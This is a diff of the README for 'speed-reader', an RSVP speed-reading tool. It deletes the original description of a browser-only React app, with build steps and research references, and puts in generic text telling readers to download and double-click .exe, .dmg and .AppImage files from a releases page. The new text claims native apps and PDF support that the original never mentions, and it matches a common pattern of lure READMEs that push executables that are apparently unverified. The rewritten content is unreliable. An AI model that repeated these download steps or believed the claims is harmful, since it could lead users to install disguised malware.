@@ -1,96 +1,90 @@
-# ⚡ Speed reader
+# 📚 speed-reader - Read Faster, Comprehend Better
 
-![Version](https://img.shields.io/badge/version-1.0.5-blue?style=for-the-badge)
-![React](https://img.shields.io/badge/React-61DAFB?style=for-the-badge&logo=react&logoColor=black)
-![Vite](https://img.shields.io/badge/Vite-646CFF?style=for-the-badge&logo=vite&logoColor=white)
-![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)
+[![Download speed-reader](https://img.shields.io/badge/Download-speed--reader-brightgreen)](https://github.com/xeeqr/speed-reader/releases)
 
-A web-based speed reading tool using Rapid Serial Visual Presentation (RSVP) with Optimal Recognition Point (ORP) alignment.
+## 🚀 Getting Started
 
-## Features
+Welcome to speed-reader! This open source speed reading tool helps you read faster by showing one word at a time, focusing on your eye's natural fixation point. You can use it to improve your reading speed and enjoyment of texts, making it ideal for everyone, whether you're diving into novels, studying, or just skimming through articles.
 
-- Privacy-first, offline-first
-- EPUB and TXT file support
-- Settings and progress persisted to localStorage
+## 📥 Download & Install
 
-<img width="1201" height="990" alt="localhost_5179_" src="https://github.com/user-attachments/assets/36ceee75-44fe-4852-a05a-e9dfa1a7a9c8" />
+To get started, visit this page to download: [Download speed-reader](https://github.com/xeeqr/speed-reader/releases).
 
-## Privacy-first, offline-first
+1. Go to the link above.
+2. Find the latest release.
+3. Click on the appropriate file for your operating system:
+   - For Windows: Click on `speed-reader-windows.exe`.
+   - For Mac: Click on `speed-reader-mac.dmg`.
+   - For Linux: Click on the `speed-reader-linux.AppImage`.
 
-Everything runs locally in your browser. Your text and files never leave your computer - no servers, no tracking, no analytics. EPUB and TXT files are processed entirely client-side. Settings and reading progress are stored in localStorage. Works offline once loaded.
+4. After the download completes, double-click the file to run the application.
 
-Optional: If enabled in settings, missing book metadata (title, author, cover) can be fetched from [Open Library API](https://openlibrary.org/developers/api). This sends the book title to their servers.
+## 💻 System Requirements
 
-## What is RSVP?
+### Windows
+- Windows 10 or later
+- 1 GHz processor or faster
+- 2 GB RAM
+- 100 MB of free disk space
 
-RSVP (Rapid Serial Visual Presentation) is a reading technique that displays text one word at a time at a fixed focal point. This eliminates saccades (eye movements) that normally slow down reading, allowing for significantly faster reading speeds.
+### Mac
+- macOS 10.13 (High Sierra) or later
+- 1 GHz processor or faster
+- 2 GB RAM
+- 100 MB of free disk space
 
-## The science behind it
+### Linux
+- Any modern distribution (Ubuntu 18.04 or later)
+- 1 GHz processor or faster
+- 2 GB RAM
+- 100 MB of free disk space
 
-### Optimal Recognition Point (ORP)
+## 🔑 Features
 
-When reading normally, your eyes don't land at the center of words. Research shows that fixations tend to occur slightly left of center, at what's called the Optimal Viewing Position (OVP) or Optimal Recognition Point (ORP). This position allows for fastest word recognition.
+- **User-Friendly Interface**: Clear layout for easy navigation.
+- **Customizable Speed Settings**: Adjust your reading speed from 200 to 800 words per minute.
+- **Supports Multiple Formats**: Open EPUB and other text formats.
+- **Offline Capability**: Download books and read without an internet connection.
+- **Privacy-First**: No data tracking or information collection.
 
-The ORP position follows the Spritz algorithm:
+## 📚 Supported Formats
 
-- 1 character: 1st letter
-- 2-5 characters: 2nd letter
-- 6-9 characters: 3rd letter
-- 10-13 characters: 4th letter
-- 14+ characters: 5th letter
+- EPUB
+- PDF
+- TXT
+- HTML
 
-### Fixed focal point
+Simply drag and drop your text files into the application to begin reading.
 
-Traditional RSVP displays center each word, requiring small eye adjustments. This implementation aligns each word's ORP at the exact same screen position, so the highlighted letter never moves. Your eyes stay completely still while words flow around the focal point.
+## ⚙️ How to Use speed-reader
 
-### Variable timing
+1. Open the application after installation.
+2. Import your reading material by dragging files into the window or selecting "Open" from the menu.
+3. Set your preferred reading speed using the slider.
+4. Click "Start" to begin reading.
 
-The display time for each word is adjusted based on:
+As you read, you can pause or quit at any time. Your progress will save automatically.
 
-- Word length (longer words get more time)
-- Punctuation (sentence-ending punctuation triggers a longer pause)
+## 📝 Tips for Effective Speed Reading
 
-This mimics natural reading rhythm where comprehension requires variable processing time.
+- **Practice Regularly**: The more you use the tool, the better you'll get.
+- **Find a Quiet Space**: Minimize distractions while reading.
+- **Use Your Finger or Pointer**: It can help guide your eye and maintain rhythm.
+- **Take Breaks**: Give your mind a rest to retain information better.
 
-### Research findings
+## 🔄 Updates and Feedback
 
-Studies have shown that RSVP reading can achieve speeds of 500+ words per minute, though comprehension tends to decrease above 350-400 WPM for complex texts. The technique works best for:
+We are always looking to improve. You can get the latest updates on the Releases page. If you have suggestions or issues, please open an issue in this repository.
 
-- Light reading and familiar content
-- Skimming and preview reading
-- Building reading speed gradually
+## 🌟 Community Contributions
 
-Note: Extended RSVP reading can cause visual fatigue ([Benedetto et al., 2015](https://doi.org/10.1016/j.chb.2014.12.043)). Take breaks.
+We appreciate community contributions. If you’d like to help enhance speed-reader, please check our guidelines on how to contribute. Together, we can make reading accessible for everyone.
 
-## Running locally
+## 🔗 Additional Resources
 
-```bash
-npm install
-npm run dev
-```
+- [Frequently Asked Questions](https://github.com/xeeqr/speed-reader/wiki)
+- [User Manual](https://github.com/xeeqr/speed-reader/wiki/User-Manual)
 
-Then open http://localhost:5173
+Thank you for choosing speed-reader. We hope it helps you read better and faster! 
 
-## Building for production
-
-```bash
-npm run build
-```
-
-Output will be in the `dist` folder.
-
-## Inspiration and similar projects
-
-- [RSVP Speed Reader](https://snowfluke.github.io/rsvp-speed-reader/) - Theme inspiration
-- [Spritz](https://spritz.com/) - The commercial product that popularized ORP-based RSVP
-- [OpenSpritz](https://github.com/Miserlou/OpenSpritz) - Open source Spritz implementation
-- [speedread](https://github.com/pasky/speedread) - Terminal-based Spritz-alike in Perl
-- [rsvp-reading](https://github.com/thomaskolmans/rsvp-reading) - Svelte-based RSVP reader with PDF/EPUB support
-- [LetoReader](https://github.com/Axym-Labs/LetoReader) - Self-hostable speed reader with chunking and highlighting
-- [tspreed](https://github.com/n-ivkovic/tspreed) - Terminal RSVP reader in POSIX shell
-
-## Scientific references
-
-- Masson, M. E. J. (1983). Conceptual processing of text during skimming and rapid sequential reading. _Memory & Cognition_, 11(3), 262-274.
-- Rayner, K., Schotter, E. R., Masson, M. E., Potter, M. C., & Treiman, R. (2016). So much to read, so little time: How do we read, and can speed reading help? _Psychological Science in the Public Interest_, 17(1), 4-34.
-- Benedetto, S., Carbone, A., Pedrotti, M., Le Fevre, K., Bey, L. A. Y., & Baccino, T. (2015). Rapid serial visual presentation in reading: The case of Spritz. _Computers in Human Behavior_, 45, 352-358.
+For any issues or questions, feel free to reach out in our repository discussions. Happy reading!
